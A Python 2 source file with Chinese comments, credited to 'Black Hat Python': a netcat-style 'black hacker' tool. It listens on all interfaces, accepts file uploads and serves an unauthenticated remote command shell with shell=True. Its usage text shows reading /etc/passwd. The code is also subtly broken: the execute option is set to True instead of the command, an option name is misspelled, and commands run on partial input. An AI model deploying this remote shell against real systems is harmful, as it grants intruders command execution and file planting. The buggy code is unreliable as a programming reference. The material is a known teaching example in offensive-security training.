#!/usr/bin/env python
# coding:utf-8
'''
这是一个基于python的类似netcat的小程序
采自python黑帽子
'''
import sys
import socket
import getopt
import threading
import subprocess

class Bhpnet(object):
    '''
    black hacker net tools class
    '''
    def __init__(self):
        '''
        构造函数
        '''
        self.listen = False
        self.command = False
        self.upload = False
        self.execute = ""
        self.target = ""
        self.upload_destination = ""
        self.port = ""

    @staticmethod
    def usage():
        '''
        工具的帮助信息
        '''
        print "BHP Net Tool"
        print
        print "Usage: bhpnet.py -t target_host -p port"
        print "-l --listen               - listen on [host]:[port] for incoming connections"
        print "-e --execute=file_to_run  - execute the given file upon receiving a connection"
        print "-c --command              - initialize a command shell"
        print "-u --upload = destination - upon receiving connection upload a file and write \r\n\
                            to [destination]"
        print
        print "Examples:"
        print "bhpnet.py -t 192.168.0.1 -p 5555 -l -c"
        print "bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"
        print "bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
        print "echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135"
        sys.exit(0)

    def main(self):
        '''
        主函数
        '''
        self.getopt()

        # 我们是进行监听还是进从标准输入发送数据？
        if not self.listen and self.target and self.port > 0:
            # 从命令行读取内存数据
            # 这里将阻塞，所以不在向标准输入发送数据时发送CTRL-D
            databuffer = sys.stdin.read()
            # 发送数据
            self.client_sender(databuffer)

        # 我们开始监听并准备上传文件、执行命令
        # 放置一个反弹shell
        # 取决于上面的命令行选项
        if self.listen:
            self.server_loop()

    def getopt(self):
        '''
        读取命令行选项
        '''
        if not sys.argv[1:]:
            self.usage()

        # 读取命令行选项
        try:
            opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu", \
            ["help", "listen", "execute", "target", "port", "command", "upload"])
        except getopt.GetoptError as err:
            print str(err)
            self.usage()

        # 读取命令行选项
        for opt, arg in opts:
            if opt in ("-h", "--help"):
                self.usage()
            elif opt in ("-l", "--listen"):
                self.listen = True
            elif opt in ("-e", "--execute"):
                self.execute = True
            elif opt in ("-c", "commandshell"):
                self.command = True
            elif opt in ("-u", "--upload"):
                self.upload_destination = arg
            elif opt in ("-t", "--target"):
                self.target = arg
            elif opt in ("-p", "--port"):
                self.port = int(arg)
            else:
                assert False, "Unhandled Option"

        # 如果args有值则输出usage()
        if args:
            self.usage()

    def client_sender(self, databuffer):
        '''
        发送数据
        '''
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            client.connect((self.target, self.port))

            if databuffer:
                client.send(databuffer)

            while True:
                # 现在等待数据回传
                recv_len = 1
                response = ""

                while recv_len:
                    data = client.recv(4096)
                    recv_len = len(data)
                    response += data

                    if recv_len < 4096:
                        break

                print response

                # 等待更多的输入
                databuffer = raw_input("")
                databuffer += "\n"
                # 发送出去
                client.send(databuffer)

        except StandardError:
            print "[*] Exception! Exiting."
            # 关闭连接
            client.close()

    def server_loop(self):
        '''
        多线程tcp服务端
        '''

        # 如果没有定义目标，那么我们监听所以接口
        if not self.target:
            self.target = "0.0.0.0"

        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((self.target, self.port))
        server.listen(5)

        while True:
            client_socket, addr = server.accept()
            print "[*] Accepted connection from: %s:%d" % (addr[0], addr[1])

            # 分拆一个线程处理新的客户端
            client_thread = threading.Thread(target=self.client_handler, \
            args=(client_socket,))
            client_thread.start()

    @staticmethod
    def run_command(command):
        '''
        运行了用户输入的命令
        '''
        # 换行
        command = command.rstrip()
        # 运行命令并将输出返回
        try:
            output = subprocess.check_output(command, stderr=subprocess.STDOUT,\
            shell=True)
        except IOError:
            output = "Failed to execute command.\r\n"
        # 将输出发送
        return output

    def client_handler(self, client_socket):
        '''
        客户端处理线程
        '''
        # 检测上传文件
        if self.upload_destination:
            # 读取所有的字符并写下目标
            file_buffer = ""
            # 持续读取数据直到没有符合的数据
            while True:
                data = client_socket.recv(1024)
                if not data:
                    break
                else:
                    file_buffer += data

            try:
                file_descriptor = open(self.upload_destination, "wb")
                file_descriptor.write(file_buffer)
                file_descriptor.close()

                # 确认文件已经写出来
                client_socket.send("Successfully saved file to %s\r\n"\
                % self.upload_destination)
            except IOError:
                client_socket.send("Failed to save file to %s\r\n" % self.upload_destination)

        # 检查命令执行
        if  self.execute:
            # 运行命令
            output = self.run_command(self.execute)
            client_socket.send(output)

        if self.command:
            while True:
                # 跳出一个窗口
                client_socket.send("<BHP:#> ")
                # 现在我们接收文件直到发现换行符（enter key）
                cmd_buffer = ""

                while "\n" not in cmd_buffer:
                    cmd_buffer += client_socket.recv(1024)

                    # 返还命令输出
                    response = self.run_command(cmd_buffer)

                    # 返回响应数据
                    client_socket.send(response)

if __name__ == '__main__':
    BHPNET = Bhpnet()
    BHPNET.main()
